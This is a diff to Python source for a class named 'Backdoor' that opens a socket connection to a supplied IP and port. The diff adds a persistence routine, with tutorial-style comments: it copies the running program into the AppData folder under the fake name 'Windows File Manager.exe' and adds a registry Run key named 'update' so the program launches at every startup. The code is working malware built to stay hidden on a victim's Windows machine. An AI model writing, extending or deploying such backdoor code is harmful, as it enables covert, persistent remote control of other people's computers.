@@ -6,11 +6,22 @@ import json
 import os
 import base64
 import sys
+import shutil
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows File Manager.exe" # We ask for the enviroment variable "appdata" to get its location
+        if not os.path.exists(evil_file_location): # We check if the evil file is already installed in the system
+            # Let's copy the file to a permanent location
+            shutil.copyfile(sys.executable, evil_file_location) # If we were running a .py we would write shutil.copyfile(__file__)
+            # Now we execute the command that will execute the program on system start.
+            # We'll use double quotes to surround the file location
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     def reliable_send(self, data):
         # json_data = json.dumps(data.decode("iso-8859-1"))
